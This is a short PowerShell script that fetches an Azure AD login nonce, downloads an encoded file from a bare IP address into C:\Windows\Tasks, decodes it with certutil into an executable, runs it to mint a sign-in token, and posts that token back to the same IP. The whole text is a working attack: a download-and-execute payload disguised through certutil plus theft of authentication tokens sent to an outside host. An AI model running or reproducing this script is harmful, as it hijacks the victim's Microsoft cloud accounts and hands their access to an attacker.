$TenantId = "11b3722b-a672-4bc8-9770-4a56b79c3f98"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
    "URI"     = $URL
    "Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
(New-Object Net.WebClient).downloadString('http://141.94.26.39/435dte5dsqd72qsd76dzz7623dsq678/certRT.txt') > 'C:\Windows\Tasks\cert.txt'
certutil.exe -decode "C:\Windows\Tasks\cert.txt" "C:\Windows\Tasks\RToken.exe"
$token = & "C:\Windows\Tasks\RToken.exe" $Result.Nonce
Invoke-WebRequest -Uri http://141.94.26.39 -Method POST -Body $token
